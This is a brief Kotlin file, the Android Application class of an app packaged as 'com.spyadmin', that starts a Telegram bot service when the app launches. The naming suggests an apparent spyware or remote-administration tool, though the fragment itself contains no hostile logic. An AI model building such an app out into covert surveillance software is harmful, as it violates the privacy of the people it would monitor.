package com.spyadmin

import android.app.Application
import android.content.Intent
import com.spyadmin.CrashHandler

class AdminApplication : Application() {

    override fun onCreate() {
        super.onCreate()
        CrashHandler.init(this)
        // Start Telegram bot service
        startService(Intent(this, TelegramBotService::class.java))
    }
}